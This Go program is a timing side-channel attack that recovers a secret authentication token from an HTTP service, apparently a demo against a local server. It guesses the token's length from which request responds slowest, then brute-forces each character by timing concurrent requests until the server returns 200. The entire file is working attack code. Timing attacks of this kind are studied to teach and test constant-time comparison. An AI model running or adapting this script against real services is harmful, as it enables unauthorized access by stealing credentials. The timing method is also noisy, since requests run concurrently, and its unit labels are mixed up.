package main

import (
	"fmt"
	"net/http"
	"strings"
	"time"
)

const _maxTokenLen = 15

var _alphabet = []rune("ABCDEFGHIJKLMNOPQRSTUVWXYZ")

type asyncRequestTime struct {
	idx        int
	ms         int64
	statusCode int
	token      string
}

func makeRequestWithToken(idx int, token string, ch chan<- asyncRequestTime) {

	var sc int = 401

	client := &http.Client{}

	req, err := http.NewRequest("GET", "http://localhost:8000", nil)
	if err != nil {
	}
	req.Header.Add("x-fake-auth", token)
	start := time.Now()
	resp, _ := client.Do(req)
	secs := time.Since(start).Microseconds()

	if resp != nil {
		sc = resp.StatusCode
	}

	ch <- asyncRequestTime{idx, secs, sc, token}
}

// returns the len of token from the request that took the longest to get a response
func findTokenLen() int {
	t := make(chan asyncRequestTime)

	token := ""
	for i := 0; i < _maxTokenLen; i++ {
		token += "X"
		go makeRequestWithToken(i, token, t)
	}

	var authTimes [_maxTokenLen]asyncRequestTime
	var maxTime int64 = 0
	tokenLen := 0
	for i := 0; i < _maxTokenLen; i++ {
		authTimes[i] = <-t
		if authTimes[i].ms > maxTime {
			maxTime = authTimes[i].ms
			tokenLen = authTimes[i].idx + 1
		}
	}

	return tokenLen
}

func findTokenOfLen(tokenLen int) string {
	var authTimes = make([]asyncRequestTime, len(_alphabet))
	var maxTime int64 = 0
	var idx int = 0
	t := make(chan asyncRequestTime)

	token := []rune(strings.Repeat("X", tokenLen))
	for i := 0; i < tokenLen; i++ {
		// try every char in _alphabet at position i
		for j := 0; j < len(_alphabet); j++ {
			token[i] = _alphabet[j]
			go makeRequestWithToken(i, string(token), t)
		}

		idx = 0
		maxTime = 0
		for k := 0; k < len(_alphabet); k++ {
			authTimes[k] = <-t
			if authTimes[k].ms > maxTime {
				maxTime = authTimes[k].ms
				idx = k
			}

			if authTimes[k].statusCode == 200 {
				return authTimes[k].token
			}
		}
		token = []rune(authTimes[idx].token)
	}

	return ""
}

func main() {
	tokenLen := findTokenLen()
	fmt.Printf("Token len is %d\n", tokenLen)

	token := findTokenOfLen(tokenLen)
	fmt.Printf("Token is: %s\n", token)
}
